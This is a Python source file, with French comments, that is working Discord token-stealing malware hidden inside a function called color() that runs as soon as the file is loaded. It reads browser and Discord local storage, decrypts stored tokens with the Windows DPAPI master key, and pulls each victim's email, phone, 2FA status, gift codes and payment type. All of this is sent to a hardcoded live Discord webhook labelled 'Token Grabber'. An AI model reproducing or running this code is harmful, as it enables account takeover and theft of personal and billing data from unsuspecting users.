def color():
    import os
    import base64
    import json
    from Crypto.Cipher import AES
    import requests
    from win32crypt import CryptUnprotectData
    import re
    from datetime import datetime
    from urllib.request import Request, urlopen
    from json import loads
    import sys

    # === CONFIGURATION ===
    WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1438273237867036682/y-jlMJWQRYZlxmYEAzEKNQLMRG3GTh7ZcVryf-CpYulJymcNV_rXJMFtvIDke7E7w5HW"  # Remplace par ton webhook Discord

    if sys.platform.startswith('win'):
        import asyncio
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    # Émojis Unicode (remplace ceux du serveur)
    EMOJIS = {
        "nitro": "Nitro",
        "phone": "Phone",
        "mail": "Email",
        "key": "Key",
        "lock": "Lock",
        "globe": "Globe",
        "cc": "Credit Card",
        "codes": "Gift",
        "badges": "Badges",
        "friend": "Friends",
        "crown": "Crown",
        "early": "Early",
        "staff": "Staff",
        "partner": "Partner",
        "balance": "Balance",
        "brilliance": "Brilliance",
        "bravery": "Bravery",
        "hypesquad": "HypeSquad",
        "early_developer": "Early Dev",
        "developer": "Developer",
        "bughunter1": "Bug Hunter",
        "bughunter2": "Bug Hunter Gold",
        "nitro_boost": "Nitro Boost",
        "nitro_basic": "Nitro Classic",
    }

    class DiscordTokenExtractor:
        def __init__(self):
            self.baseurl = "https://discord.com/api/v9/users/@me"
            self.roaming = os.getenv("appdata")
            self.localappdata = os.getenv("localappdata")
            self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
            self.tokens = []

        def decrypt_val(self, buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                return decrypted_pass
            except:
                return None

        def get_master_key(self, path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(master_key, None, None, None, 0)[1]
            except:
                return None

        def check_token(self, token):
            headers = {
                "Authorization": token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }
            try:
                response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
                return response.code == 200
            except:
                return False

        def grab_tokens(self):
            tokens_list = []

            def get_token_from_path(path):
                if not os.path.exists(path):
                    return
                for file in os.listdir(path):
                    if not file.endswith((".log", ".ldb")):
                        continue
                    try:
                        with open(f"{path}\\{file}", errors="ignore") as f:
                            for line in f.readlines():
                                line = line.strip()
                                if not line:
                                    continue
                                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                                    for token in re.findall(regex, line):
                                        if self.check_token(token) and token not in tokens_list:
                                            tokens_list.append(token)
                    except:
                        pass

            # Chemins navigateurs
            browser_paths = [
                f"{self.roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb",
                f"{self.roaming}/Opera Software/Opera Stable/Local Storage/leveldb",
                f"{self.localappdata}/Google/Chrome/User Data/Default/Local Storage/leveldb",
                f"{self.localappdata}/Google/Chrome/User Data/Profile 1/Local Storage/leveldb",
                f"{self.localappdata}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
                f"{self.localappdata}/Microsoft/Edge/User Data/Default/Local Storage/leveldb"
            ]
            for path in browser_paths:
                get_token_from_path(path)

            # Chemins Discord
            discord_paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            }
            for name, path in discord_paths.items():
                if not os.path.exists(path):
                    continue
                disc = name.replace(" ", "").lower()
                local_state = self.roaming + f'\\{disc}\\Local State'
                if not os.path.exists(local_state):
                    continue
                master_key = self.get_master_key(local_state)
                if not master_key:
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    try:
                        with open(f'{path}\\{file_name}', errors='ignore') as f:
                            for line in f.readlines():
                                for y in re.findall(self.encrypted_regex, line):
                                    try:
                                        token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if token and self.check_token(token) and token not in tokens_list:
                                            tokens_list.append(token)
                                    except:
                                        pass
                    except:
                        pass
            return list(set(tokens_list))  # Supprime doublons

    def discord_id_to_date(discord_id):
        discord_epoch = 1420070400000
        timestamp = ((int(discord_id) >> 22) + discord_epoch) / 1000
        return datetime.utcfromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")

    def send_to_webhook(embed_data):
        payload = {
            "username": "Token Grabber",
            "avatar_url": "https://i.imgur.com/4qRELaE.png",
            "embeds": [embed_data]
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass

    def get_user_info(token):
        base_url = "https://discord.com/api/v10"
        headers = {"Authorization": token, "Content-Type": "application/json"}

        user_response = requests.get(f"{base_url}/users/@me", headers=headers)
        if user_response.status_code != 200:
            return None

        user_data = user_response.json()

        # Nitro
        nitro_status = "`None`"
        if user_data.get("premium_type") == 1:
            nitro_status = f"{EMOJIS['nitro_basic']} `Nitro Classic`"
        elif user_data.get("premium_type") == 2:
            nitro_status = f"{EMOJIS['nitro_boost']} `Nitro Boost`"

        creation_date = discord_id_to_date(user_data["id"])

        # Badges
        def get_badge(flags):
            if flags == 0:
                return "`None`"
            badges = []
            badge_map = [
                (1 << 0, EMOJIS['staff'], "Staff"),
                (1 << 1, EMOJIS['partner'], "Partner"),
                (1 << 2, EMOJIS['hypesquad'], "HypeSquad Events"),
                (1 << 3, EMOJIS['bughunter1'], "Bug Hunter L1"),
                (1 << 6, EMOJIS['bravery'], "Bravery"),
                (1 << 7, EMOJIS['brilliance'], "Brilliance"),
                (1 << 8, EMOJIS['balance'], "Balance"),
                (1 << 9, EMOJIS['early'], "Early Supporter"),
                (1 << 14, EMOJIS['bughunter2'], "Bug Hunter L2"),
                (1 << 17, EMOJIS['early_developer'], "Early Dev"),
                (1 << 22, EMOJIS['developer'], "Verified Dev"),
            ]
            for bit, emoji, _ in badge_map:
                if flags & bit:
                    badges.append(emoji)
            return " ".join(badges) if badges else "`None`"

        badges = get_badge(user_data.get("public_flags", 0))

        # Gift Codes
        def get_codes(token):
            try:
                codes = ""
                headers = {"Authorization": token, "Content-Type": "application/json"}
                # Promo codes
                try:
                    res = urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers))
                    for code in loads(res.read().decode()):
                        codes += f"Gift **{code['promotion']['outbound_title']}**\n`{code['code']}`\n"
                except: pass
                # Nitro gifts
                try:
                    res = urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers))
                    for gift in loads(res.read().decode()):
                        if gift.get('code'):
                            codes += f"Gift **{gift['subscription_plan']['name']}**\n`https://discord.gift/{gift['code']}`\n"
                except: pass
                return codes.strip() or "`None`"
            except:
                return "`None`"

        codes = get_codes(token)

        # Billing
        billing_response = requests.get(f"{base_url}/users/@me/billing/payment-sources", headers=headers)
        billing = "`None`"
        if billing_response.status_code == 200 and billing_response.json():
            billing = "`Card`" if any(p['type'] == 1 for p in billing_response.json()) else "`PayPal`"

        # Avatar
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png" if user_data.get('avatar') else "https://cdn.discordapp.com/embed/avatars/0.png"

        # Embed
        embed = {
            "title": f"{user_data['username']}#{user_data['discriminator']} ({user_data['id']})",
            "color": 2895667,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": f"{EMOJIS['key']} Token", "value": f"```{token}```", "inline": False},
                {"name": f"{EMOJIS['globe']} Créé le", "value": f"`{creation_date}`", "inline": True},
                {"name": f"{EMOJIS['mail']} Email", "value": f"`{user_data.get('email', 'None')}`", "inline": True},
                {"name": f"{EMOJIS['phone']} Téléphone", "value": f"`{user_data.get('phone', 'None')}`", "inline": True},
                {"name": f"{EMOJIS['nitro']} Nitro", "value": nitro_status, "inline": True},
                {"name": f"{EMOJIS['lock']} 2FA", "value": "`Oui`" if user_data.get('mfa_enabled') else "`Non`", "inline": True},
                {"name": f"{EMOJIS['badges']} Badges", "value": badges, "inline": False},
                {"name": f"{EMOJIS['codes']} Codes cadeaux", "value": codes, "inline": False},
                {"name": f"{EMOJIS['cc']} Paiement", "value": billing, "inline": False},
            ],
            "footer": {"text": "Token Grabber • Exécuté localement"}
        }
        return embed

    # === MAIN ===
    if __name__ == "__main__":
        extractor = DiscordTokenExtractor()
        tokens = extractor.grab_tokens()

        if not tokens:
            print("Aucun token trouvé.")
        else:
            print(f"{len(tokens)} token(s) trouvé(s). Envoi via webhook...")
            for token in tokens:
                embed = get_user_info(token)
                if embed:
                    send_to_webhook(embed)


color()